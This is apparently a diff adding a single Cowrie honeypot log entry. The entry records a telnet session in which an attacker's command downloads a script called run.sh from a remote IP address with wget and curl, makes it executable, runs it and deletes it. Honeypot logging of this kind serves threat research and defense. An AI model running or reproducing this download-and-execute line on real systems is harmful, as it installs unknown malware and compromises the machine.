@@ -1,0 +1,11 @@
+{
+"eventid":"cowrie.command.input",
+"input":"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.106.146.195/run.sh -O run.sh; curl -O http://87.106.146.195/run.sh; chmod 777 run.sh; sh run.sh; rm -rf run.sh",
+"message":"CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.106.146.195/run.sh -O run.sh; curl -O http://87.106.146.195/run.sh; chmod 777 run.sh; sh run.sh; rm -rf run.sh",
+"sensor":"1f06f30a4cfe",
+"uuid":"d64dce96-e4a4-11f0-ba9a-a6b6eec8e0ac",
+"timestamp":"2026-02-15T19:01:17.231272Z",
+"src_ip":"87.106.146.117",
+"session":"247a2d471847",
+"protocol":"telnet"
+}
